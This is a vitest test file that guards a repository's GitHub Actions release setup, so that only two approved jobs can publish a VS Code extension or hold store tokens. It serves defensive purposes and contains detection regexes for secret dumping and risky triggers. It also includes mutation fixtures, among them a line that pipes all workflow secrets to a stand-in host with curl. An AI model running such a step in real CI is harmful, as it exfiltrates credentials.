// @reads-the-tree
/**
 * TWO JOBS PUBLISH THE EXTENSION, BEHIND A PERSON'S APPROVAL, AND NOTHING ELSE DOES.
 *
 * The VS Code extension is published by two jobs of `.github/workflows/release.yml`, both asking for the
 * `extension-stores` environment (a person approves them there): `publish-marketplace` sends it to the Visual
 * Studio Marketplace by trusted publishing (`vsce publish --oidc`, with `id-token: write` and no secret), and
 * `publish-open-vsx` sends it to Open VSX with the one secret of the environment, `OVSX_PAT`, and no `id-token`,
 * so no code of a third party runs in a job that can ask for the Marketplace's token. Everywhere else the command
 * that sends the file to a store and the tokens that let it are refused: another workflow, another job of that
 * workflow, a job of it that does not ask for the environment, the header of the file, a package script. The
 * Marketplace token (`VSCE_PAT`) is named nowhere, and `--oidc` is in the one job.
 * This reads every workflow git carries (not `release.yml` by name only: the next one will not announce itself)
 * and every package manifest. The text is read comments included, so a token named in a comment is a token
 * named; a comment sits with the job that follows it.
 *
 * A guard that finds nothing is only worth something if it can find, so the cases below hand the scan the
 * defect it exists for: the publish in another job, the publish job without its environment, the same text
 * in another workflow, a token in a job that is not the one, the environment asked for by another job, the
 * versioned form of the command (`vsce@4.1.0 publish`), a secret reached by a computed name or all at once,
 * the Entra credential, a trigger that runs the workflow with the base repository's secrets on a fork's code.
 * Each one must be refused.
 */

import { execFileSync } from 'node:child_process';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { describe, expect, it } from 'vitest';

const ROOT = fileURLToPath(new URL('../../../', import.meta.url));

const TRACKED: readonly string[] = execFileSync(
  'git',
  ['ls-files', '--cached', '--others', '--exclude-standard'],
  { cwd: ROOT, encoding: 'utf-8', maxBuffer: 32 * 1024 * 1024 },
)
  .split('\n')
  .filter((where) => where !== '');

const WORKFLOWS = TRACKED.filter(
  (where) => where.startsWith('.github/workflows/') && /\.ya?ml$/.test(where),
);
const MANIFESTS = TRACKED.filter((where) => /(^|\/)package\.json$/.test(where));

/**
 * A command that publishes (bare, versioned as `vsce@4.1.0 publish`, or by the path of the installed binary), the
 * secret one needs, or the environment that holds them. Anywhere in the text, comments included.
 */
const PUBLISHES = new RegExp(
  [
    String.raw`\b(?:vsce|ovsx)["']?(?:@[\w.-]+)?["']?\s+(?:publish|login)\b`,
    String.raw`\bVSCE_PAT\b`,
    String.raw`--oidc\b`,
    String.raw`\bOVSX_PAT\b`,
    String.raw`^\s*environment:\s*["']?extension-stores\b`,
    String.raw`\bname:\s*["']?extension-stores\b`,
  ].join('|'),
  'm',
);

/**
 * What no place may hold, the one job included: a way to reach a secret that does not name it (a computed name,
 * all of them, the whole set handed on), the Entra credential that publishes without a token, and a trigger
 * that runs the workflow, secrets and all, on what a pull request brings.
 */
const NEVER =
  /\bsecrets\s*(?:\[|\}\})|\btoJSON\(\s*secrets\b|\bsecrets:\s*inherit\b|--azure-credential\b|\bpull_request_target\b/;

/** The one place that may: the workflow, the two jobs and the environment a person approves them in. */
const PLACE = {
  workflow: '.github/workflows/release.yml',
  marketplace: 'publish-marketplace',
  openVsx: 'publish-open-vsx',
  environment: 'extension-stores',
};
const JOBS: readonly string[] = [PLACE.marketplace, PLACE.openVsx];

/** What precedes the jobs, and each job with the comment lines that sit right above its key. */
function jobsOf(text: string): { header: string; jobs: Map<string, string> } {
  const lines = text.split('\n');
  const keys: { name: string; at: number }[] = [];
  let inJobs = false;
  lines.forEach((line, at) => {
    if (/^jobs:\s*$/.test(line)) inJobs = true;
    const key = inJobs ? /^ {2}([a-z][\w-]*):\s*$/.exec(line) : null;
    if (key) keys.push({ name: key[1] as string, at });
  });
  const starts = keys.map(({ at }) => {
    let start = at;
    while (start > 0 && /^\s*#/.test(lines[start - 1] as string)) start--;
    return start;
  });
  const jobs = new Map<string, string>();
  keys.forEach(({ name }, i) => {
    jobs.set(name, lines.slice(starts[i], starts[i + 1] ?? lines.length).join('\n'));
  });
  return { header: lines.slice(0, starts[0] ?? lines.length).join('\n'), jobs };
}

/** The one install line the job may have: lockfile, no script, the release tools' own folder. */
const INSTALL_LINE = 'npm ci --ignore-scripts --no-audit --no-fund --prefix .github/release-tools';

/**
 * Why the install of the job is refused. In npm a later flag wins, so `--ignore-scripts --ignore-scripts=false`
 * runs the install scripts with the tokens' job around it: no `ignore-scripts=` and no `--foreground-scripts`
 * anywhere in the job, and every `npm ci` is the exact line.
 */
function installOffences(block: string): string[] {
  const found: string[] = [];
  if (/ignore-scripts\s*=/.test(block)) found.push('sets ignore-scripts with a value');
  if (/--foreground-scripts\b/.test(block)) found.push('asks for --foreground-scripts');
  for (const line of block.split('\n')) {
    const at = line.indexOf('npm ci');
    if (at >= 0 && !line.trim().startsWith('#') && !line.endsWith(`run: ${INSTALL_LINE}`)) {
      found.push(`an npm ci that is not the exact line: ${line.trim()}`);
    }
  }
  return found;
}

/** Why a workflow is refused, in words; empty when it is clean. */
function offences(where: string, text: string): string[] {
  const never = NEVER.exec(text);
  if (never)
    return [`${where}: names ${never[0]}, a way to a secret or a trigger no place may use`];
  if (!PUBLISHES.test(text)) return [];
  if (where !== PLACE.workflow)
    return [`${where}: publishes the extension or holds a token for it`];
  const { header, jobs } = jobsOf(text);
  const found: string[] = [];
  if (PUBLISHES.test(header)) found.push(`${where}: its header names a publish or a token`);
  for (const [name, block] of jobs) {
    if (!PUBLISHES.test(block)) continue;
    if (!JOBS.includes(name)) {
      found.push(`${where}: job ${name} publishes the extension or holds a token for it`);
      continue;
    }
    if (!new RegExp(`^ {4}environment: ${PLACE.environment}$`, 'm').test(block)) {
      found.push(`${where}: job ${name} does not ask for the ${PLACE.environment} environment`);
    }
    const code = block.replace(/^\s*#.*$/gm, '');
    if (name === PLACE.openVsx && /--oidc\b|^ {6}id-token:/m.test(code)) {
      found.push(`${where}: job ${name} can ask for the OIDC token, and it runs ovsx`);
    }
    if (name === PLACE.marketplace && /\bsecrets\.|_PAT\b/.test(code)) {
      found.push(`${where}: job ${name} holds a secret, and it publishes by trusted publishing`);
    }
  }
  return found;
}

const RELEASE = readFileSync(join(ROOT, PLACE.workflow), 'utf-8');

describe('two jobs publish the extension, behind an approval', () => {
  it('has no publish command or marketplace token in any workflow or package script but the one job', () => {
    const found = WORKFLOWS.flatMap((where) =>
      offences(where, readFileSync(join(ROOT, where), 'utf-8')),
    );
    expect(found, 'a file that publishes the extension, or holds a token for it').toEqual([]);
    const scripts = MANIFESTS.filter((where) =>
      PUBLISHES.test(readFileSync(join(ROOT, where), 'utf-8')),
    );
    expect(scripts, 'a package manifest that publishes the extension').toEqual([]);
  });

  it('is there: both jobs exist, ask for the environment, need the packing job and publish that file', () => {
    expect(WORKFLOWS).toContain(PLACE.workflow);
    const jobs = jobsOf(RELEASE).jobs;
    const market = jobs.get(PLACE.marketplace) ?? '';
    const open = jobs.get(PLACE.openVsx) ?? '';
    for (const block of [market, open]) {
      expect(block).toMatch(/^ {4}environment: extension-stores$/m);
      expect(block).toMatch(/^ {4}needs: \[plan, vsix\]$/m);
      // the token is in the environment of the step and nowhere else: not on a command line
      expect(block).not.toMatch(/\s-p\s|--pat\b/);
      // the file is checked against the hash before a store is reached
      expect(block.indexOf('needs.vsix.outputs.sha256')).toBeGreaterThan(-1);
    }
    // the Marketplace: trusted publishing, the token of the workflow and no secret at all
    expect(market).toMatch(
      /release-tools\/node_modules\/\.bin\/vsce" publish --oidc --skip-duplicate --packagePath /,
    );
    expect(market).toMatch(/^ {6}id-token: write$/m);
    expect(market).toMatch(/^ {6}contents: read$/m);
    expect(market.replace(/^\s*#.*$/gm, '')).not.toMatch(/\bsecrets\.|VSCE_PAT|ovsx/);
    // Open VSX: its one secret, and no way to ask for the OIDC token
    expect(open).toMatch(/release-tools\/node_modules\/\.bin\/ovsx" publish --skip-duplicate /);
    expect(open).toMatch(/OVSX_PAT: \$\{\{ secrets\.OVSX_PAT \}\}/);
    expect(open.replace(/^\s*#.*$/gm, '')).not.toMatch(/id-token|--oidc|\bvsce\b/);
    expect(open.indexOf('needs.vsix.outputs.sha256')).toBeLessThan(open.indexOf('OVSX_PAT: '));
  });

  it('asks for the OIDC token in no other job of the release workflow, and names --oidc nowhere else', () => {
    const asking = [...jobsOf(RELEASE).jobs]
      .filter(([, block]) => /^ {6}id-token:/m.test(block))
      .map(([name]) => name);
    expect(asking).toEqual(['publish', PLACE.marketplace]);
    const oidc = TRACKED.filter(
      (where) =>
        /^\.github\/(?:workflows|release-tools)\//.test(where) &&
        /--oidc\b/.test(readFileSync(join(ROOT, where), 'utf-8')),
    );
    expect(oidc).toEqual([PLACE.workflow]);
  });

  it('installs the command lines from the lockfile with no script and no secret, and resolves nothing after', () => {
    for (const name of JOBS) {
      const block = jobsOf(RELEASE).jobs.get(name) ?? '';
      const install = block.indexOf('npm ci --ignore-scripts');
      expect(install, `${name}: the install step`).toBeGreaterThan(-1);
      expect(installOffences(block), name).toEqual([]);
      expect(block).toMatch(
        /^ {8}run: npm ci --ignore-scripts .*--prefix \.github\/release-tools$/m,
      );
      // every secret comes after the install, and no step resolves a package from the registry
      if (block.includes('${{ secrets.')) {
        expect(install).toBeLessThan(block.indexOf('${{ secrets.'));
      }
      expect(block).not.toMatch(
        /\bnpx\b|\bnpm (?:install|i|exec|x)\b|\bpnpm (?:dlx|add|install)\b/,
      );
    }
    const tools = JSON.parse(
      readFileSync(join(ROOT, '.github/release-tools/package.json'), 'utf-8'),
    ) as {
      dependencies: Record<string, string>;
    };
    expect(tools.dependencies).toEqual({ '@vscode/vsce': '4.1.0', ovsx: '1.3.0' });
    const lock = JSON.parse(
      readFileSync(join(ROOT, '.github/release-tools/package-lock.json'), 'utf-8'),
    ) as {
      packages: Record<string, { integrity?: string; link?: boolean }>;
    };
    const without = Object.entries(lock.packages).filter(
      ([name, entry]) => name !== '' && !entry.link && entry.integrity === undefined,
    );
    expect(
      without.map(([name]) => name),
      'a locked package with no integrity',
    ).toEqual([]);
  });

  it('refuses an install that turns the scripts back on, by a later flag or by another form', () => {
    const block = jobsOf(RELEASE).jobs.get(PLACE.marketplace) ?? '';
    expect(installOffences(block)).toEqual([]);
    for (const tail of [
      ' --ignore-scripts=false',
      ' --foreground-scripts',
      ' --ignore-scripts=false --ignore-scripts',
    ]) {
      const mutated = block.replace(
        `${INSTALL_LINE}`,
        `npm ci --ignore-scripts${tail} --no-audit --no-fund --prefix .github/release-tools`,
      );
      expect(mutated, tail).not.toBe(block);
      expect(installOffences(mutated), tail).not.toEqual([]);
    }
    const twice = block.replace(
      INSTALL_LINE,
      'npm ci --ignore-scripts --ignore-scripts=false --prefix .github/release-tools',
    );
    expect(installOffences(twice)).not.toEqual([]);
  });

  it('still packs the extension in CI and keeps the file, so the scan has something to refuse', () => {
    const ci = readFileSync(join(ROOT, '.github/workflows/ci.yml'), 'utf-8');
    expect(ci).toMatch(/run: pnpm --filter @mnema\/vscode package\b/);
    expect(ci).toMatch(/path: packages\/vscode\/mnema-\*\.vsix/);
    expect(WORKFLOWS).toContain('.github/workflows/ci.yml');
  });

  it('refuses the publish in a job that is not the one', () => {
    const moved = RELEASE.replace(/^ {2}publish-marketplace:$/m, '  publish-the-extension:');
    expect(offences(PLACE.workflow, moved)).toEqual([
      `${PLACE.workflow}: job publish-the-extension publishes the extension or holds a token for it`,
    ]);
    const extra = `${RELEASE}\n  another:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: npx ovsx publish x.vsix\n`;
    expect(offences(PLACE.workflow, extra)).toEqual([
      `${PLACE.workflow}: job another publishes the extension or holds a token for it`,
    ]);
  });

  it('refuses a publish job without its environment', () => {
    const bare = RELEASE.replace(/^ {4}environment: extension-stores$/m, '');
    expect(offences(PLACE.workflow, bare)).toEqual([
      `${PLACE.workflow}: job ${PLACE.marketplace} does not ask for the ${PLACE.environment} environment`,
    ]);
  });

  it('refuses the Marketplace token back, the OIDC token in the Open VSX job, and the two jobs joined', () => {
    const pat = RELEASE.replace(
      /^( {10}VERSION: \$\{\{ needs\.plan\.outputs\.version \}\}\n)(?= {8}run: \|\n {10}set -euo pipefail\n {10}served=)/m,
      '$1          VSCE_PAT: ${{ secrets.VSCE_PAT }}\n',
    );
    expect(pat).not.toBe(RELEASE);
    expect(offences(PLACE.workflow, pat)).not.toEqual([]);
    const idToken = RELEASE.replace(
      /(publish-open-vsx:\n(?:.*\n)*? {4}permissions:\n {6}contents: read\n)/,
      '$1      id-token: write\n',
    );
    expect(idToken).not.toBe(RELEASE);
    expect(offences(PLACE.workflow, idToken)).toEqual([
      `${PLACE.workflow}: job ${PLACE.openVsx} can ask for the OIDC token, and it runs ovsx`,
    ]);
    const joined = RELEASE.replace(/^ {2}publish-open-vsx:$/m, '  publish-both:');
    expect(joined).not.toBe(RELEASE);
    expect(offences(PLACE.workflow, joined)).toEqual([
      `${PLACE.workflow}: job publish-both publishes the extension or holds a token for it`,
    ]);
  });

  it('refuses a token in the header of the workflow, in another job, or in another workflow', () => {
    expect(offences(PLACE.workflow, `# the token is VSCE_PAT\n${RELEASE}`)).toEqual([
      `${PLACE.workflow}: its header names a publish or a token`,
    ]);
    const leaked = RELEASE.replace(/^ {2}vsix:\n/m, '  vsix:\n    env:\n      TOKEN: x OVSX_PAT\n');
    expect(offences(PLACE.workflow, leaked)).toEqual([
      `${PLACE.workflow}: job vsix publishes the extension or holds a token for it`,
    ]);
    expect(offences('.github/workflows/ci.yml', RELEASE)).toEqual([
      '.github/workflows/ci.yml: publishes the extension or holds a token for it',
    ]);
  });

  it('refuses the environment asked for by a job that is not the one, in this workflow or another', () => {
    const asked = (name: string) =>
      `  ${name}:\n    runs-on: ubuntu-24.04\n    environment: extension-stores\n    steps:\n      - run: true\n`;
    expect(offences('.github/workflows/ci.yml', `jobs:\n${asked('leak')}`)).toEqual([
      '.github/workflows/ci.yml: publishes the extension or holds a token for it',
    ]);
    expect(offences(PLACE.workflow, `${RELEASE}\n${asked('leak')}`)).toEqual([
      `${PLACE.workflow}: job leak publishes the extension or holds a token for it`,
    ]);
    const named = '  leak:\n    environment:\n      name: extension-stores\n    steps: []\n';
    expect(offences(PLACE.workflow, `${RELEASE}\n${named}`)).toEqual([
      `${PLACE.workflow}: job leak publishes the extension or holds a token for it`,
    ]);
  });

  it('refuses the versioned form of the command, wherever it is', () => {
    const versioned = '      - run: npx --yes @vscode/vsce@4.1.0 publish --packagePath x.vsix\n';
    const other = `jobs:\n  another:\n    runs-on: ubuntu-24.04\n    steps:\n${versioned}`;
    expect(offences('.github/workflows/ci.yml', other)).toEqual([
      '.github/workflows/ci.yml: publishes the extension or holds a token for it',
    ]);
    const inVsix = RELEASE.replace(/^ {6}- name: Install that file in VS Code/m, `${versioned}$&`);
    expect(inVsix).not.toBe(RELEASE);
    expect(offences(PLACE.workflow, inVsix)).toEqual([
      `${PLACE.workflow}: job vsix publishes the extension or holds a token for it`,
    ]);
    const bin = '      - run: .github/release-tools/node_modules/.bin/ovsx publish x.vsix\n';
    expect(offences('.github/workflows/ci.yml', `jobs:\n  a:\n    steps:\n${bin}`)).toHaveLength(1);
  });

  it('refuses a secret reached by a computed name or all at once, even in the one job', () => {
    const computed = `      - run: echo "\${{ secrets[format('OVSX_{0}', 'P')] }}"\n`;
    const dumped = `      - run: echo '\${{ toJSON(secrets) }}' | curl -d @- https://example.test\n`;
    const inherited = '    secrets: inherit\n';
    for (const [step, job] of [
      [computed, 'vsix'],
      [dumped, 'vsix'],
      [computed, PLACE.marketplace],
      [dumped, PLACE.openVsx],
    ] as const) {
      const at = new RegExp(`^ {2}${job}:\\n(?:.*\\n)*? {4}steps:\\n`, 'm');
      const mutated = RELEASE.replace(at, (head) => `${head}${step}`);
      expect(mutated, `${job} got the step`).not.toBe(RELEASE);
      expect(offences(PLACE.workflow, mutated), `${job}: ${step}`).toHaveLength(1);
    }
    expect(offences('.github/workflows/ci.yml', `jobs:\n  a:\n${inherited}`)).toHaveLength(1);
    expect(offences('.github/workflows/ci.yml', `jobs:\n  a:\n    steps:\n${dumped}`)).toHaveLength(
      1,
    );
  });

  it('refuses a trigger that runs the workflow on what a pull request brings, and the Entra credential', () => {
    const trigger = RELEASE.replace(/^on:\n/m, 'on:\n  pull_request_target:\n');
    expect(trigger).not.toBe(RELEASE);
    expect(offences(PLACE.workflow, trigger)).toHaveLength(1);
    const azure = RELEASE.replace(
      /^ {6}- name: Install that file in VS Code/m,
      '      - run: vsce publish --azure-credential\n$&',
    );
    expect(azure).not.toBe(RELEASE);
    expect(offences(PLACE.workflow, azure)).toHaveLength(1);
    const inJob = RELEASE.replace(
      /release-tools\/node_modules\/\.bin\/vsce" publish --oidc /,
      '$&--azure-credential ',
    );
    expect(inJob).not.toBe(RELEASE);
    expect(offences(PLACE.workflow, inJob)).toHaveLength(1);
  });
});
